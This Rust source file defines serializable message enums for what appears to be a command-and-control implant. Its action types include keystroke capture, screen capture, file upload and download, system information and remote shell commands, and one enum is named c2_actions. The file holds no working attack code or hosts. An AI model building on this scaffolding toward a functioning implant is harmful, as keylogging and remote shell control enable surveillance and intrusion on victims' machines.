use std::str::FromStr;

use serde::{Serialize, Deserialize};

#[derive(Serialize, Deserialize, Debug)]
pub enum RequestActionType {
    Keystrokes,
    ScreenCapture,
    FileUpload,
    ShellResponse,
    SystemInfo,
    CheckIn,
}

#[derive(Serialize, Deserialize, Debug)]
pub enum ResponseActionType {
    CallAction,
    ShellCommand,
    FileDownload,
    FileUpload,
    Wait,
}

#[derive(Serialize, Deserialize, Debug)]
pub enum c2_actions {
    ShellCommand,
    SystemInfo,
    FileUpload,
    Wait,
}
impl Copy for c2_actions {}
impl Clone for c2_actions {
    fn clone(&self) -> Self {
        *self
    }
}
impl FromStr for c2_actions {
    type Err = ();

    fn from_str(action: &str) -> Result<Self, Self::Err> {
        match action {
            "ShellCommand" => Ok(c2_actions::ShellCommand),
            "SystemInfo" => Ok(c2_actions::SystemInfo),
            "FileUpload" => Ok(c2_actions::FileUpload),
            "Wait" => Ok(c2_actions::Wait),
            "wait" => Ok(c2_actions::Wait),
            _ => Err(()),
        }
    }
}
impl ToString for c2_actions {
    fn to_string(&self) -> String {
        match self {
            c2_actions::ShellCommand => "ShellCommand".to_string(),
            c2_actions::SystemInfo => "SystemInfo".to_string(),
            c2_actions::FileUpload => "FileUpload".to_string(),
            c2_actions::Wait => "Wait".to_string(),
        }
    }
}